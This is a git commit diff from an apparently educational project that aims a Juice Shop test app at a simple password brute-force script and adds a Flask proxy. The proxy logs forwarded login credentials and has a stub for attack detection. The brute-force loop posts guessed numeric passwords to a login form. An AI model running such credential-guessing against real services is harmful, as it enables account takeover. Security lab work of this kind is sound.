27cf4967d8db1473f6061ad9d569a27aeb80e781
mk600449@gmail.com <mk600449@gmail.com>
2022-03-20 19:50:10 +0200

    move to juice shop

--- attacker.py
+++ attacker.py
@@ -1,6 +1,25 @@
 import requests
 
-def brute_force_attack_password():
+def brute_force_attack_password_to_juice_shop():
+    #SITE_NAME = 'http://127.0.0.1:5000/#/login'
+
+    for i in range(123456, 123457):
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        payload = {'email': 'mk600449@gmail.com', 'password': i}
+        session = requests.Session()
+        res = session.post('http://localhost:5000/login',data=payload,headers = headers)
+        print(res.text)
+
+
+
+brute_force_attack_password_to_juice_shop()
+
+
+
+
+
+def brute_force_attack_password_to_hack_yourself():
+    #SITE_NAME = 'https://hack-yourself-first.com/'
     for i in range(123450, 123470):
         headers = {'User-Agent': 'Mozilla/5.0'}
         payload = {'Email': 'hiwedo2878@superyp.com', 'Password': i}
@@ -11,7 +30,8 @@ def brute_force_attack_password():
         print(res.text)
 
 
-brute_force_attack_password()
+#brute_force_attack_password_to_hack_yourself()
+
 
 
 
--- main.py
+++ main.py
@@ -7,7 +7,7 @@ import requests
 from flask import Flask, request, Response
 
 app = Flask('__main__')
-SITE_NAME = 'https://hack-yourself-first.com/'
+SITE_NAME = "http://localhost:3000/"
 
 
 def detect_attack():
@@ -15,7 +15,7 @@ def detect_attack():
 
 
 @app.route('/', defaults={'path': ''})
-# @app.route('/<path:path>')
+#  @app.route('/<path:path>')
 def proxy(path):
     # s = requests.session()
     # if detect_attack():
@@ -29,12 +29,58 @@ def proxy(path):
     # return fake_response()
     # option 5:
     # return hold_session(s)
+    resp = requests.request(
+        method=request.method,
+        url=SITE_NAME + path,
+        data=request.get_data(),
+        cookies=request.cookies,
+        allow_redirects=False)
 
-    return get(f'{SITE_NAME}{path}').content
+    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+    headers = [(name, value) for (name, value) in resp.raw.headers.items()
+               if name.lower() not in excluded_headers]
+
+    response = Response(resp.content, resp.status_code, headers)
+
+
+    return response
+    #return get(f'{SITE_NAME}{path}').content
+
+
+#post data for juice shop http://localhost:5000/#/login
+@app.route('/login',methods=['POST', 'GET'])
+def login():
+    print("ssssssssssssssssssssssssssssssssssssssssssssssss")
+    raw_data = request.get_data(as_text=True)
+    print(raw_data)
+    payload_array = raw_data.split("&")
+    extract_email = (payload_array[0].split("="))[1].replace("%40","@")
+    extract_password = (payload_array[1].split("="))[1]
+    print(extract_email + "  ::  " + extract_password)
+    payload = {'email': extract_email, 'password': extract_password}
+
+    resp = requests.request(
+        method='POST',
+        url=SITE_NAME + '/#/login',
+        data=payload,
+        cookies=request.cookies,
+        allow_redirects=False)
+
+    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+    headers = [(name, value) for (name, value) in resp.raw.headers.items()
+               if name.lower() not in excluded_headers]
+
+    response = Response(resp.content, resp.status_code, headers)
+    print(response)
+    return response
+
+    #return post(f'{SITE_NAME}/#/login',data=payload).content
 
 
 
 
+"""
+#post data for hack-yourself-first.com
 @app.route('/Account/Login',methods=['POST', 'GET'])
 def login():
     raw_data = request.get_data(as_text=True)
@@ -50,5 +96,6 @@ def login():
     payload = {'Email': email, 'Password': password}
     return post(f'{SITE_NAME}/Account/Login',data=payload).content
 
+"""
 
 app.run(debug=True)
